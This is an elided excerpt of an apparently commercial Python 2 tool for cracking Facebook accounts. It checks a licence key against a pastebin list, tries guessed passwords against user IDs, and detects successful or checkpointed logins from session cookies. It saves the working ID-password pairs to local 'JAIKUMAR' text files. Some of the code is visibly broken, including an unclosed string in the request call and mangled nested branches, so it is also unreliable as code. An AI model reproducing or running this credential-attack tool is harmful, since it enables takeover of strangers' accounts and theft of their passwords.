...
def main_apv():
    ...
    try:
        key1 = open('/sdcard/.KING.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        ...
        os.system('xdg-open https://wa.me/03312734753')

    r1 = requests.get(https://pastebin.com/raw/TmAaDHXE').txt
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member In JAIKUMAR Paid Commands '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                ok = open('JAIKUMAR random-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[JAIKUMAR-CP] ' + coc + user + ' | ' + pass1
                cp = open('JAIKUMAR random-cp.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;91m[JAIKUMAR-CP] ' + uid + ' | ' + pass1
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;97m[JAIKUMAR-CP] ' + uid + ' | ' + pass1
                cp = open('JAIKUMAR-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    print '\x1b[1;97m[JAIKUMAR-CP] ' + uid + ' | ' + pass2
                    cp = open('JAIKUMAR-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;97m[JAIKUMAR-CP] ' + uid + ' | ' + pass4
                            cp = open('JAIKUMAR-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
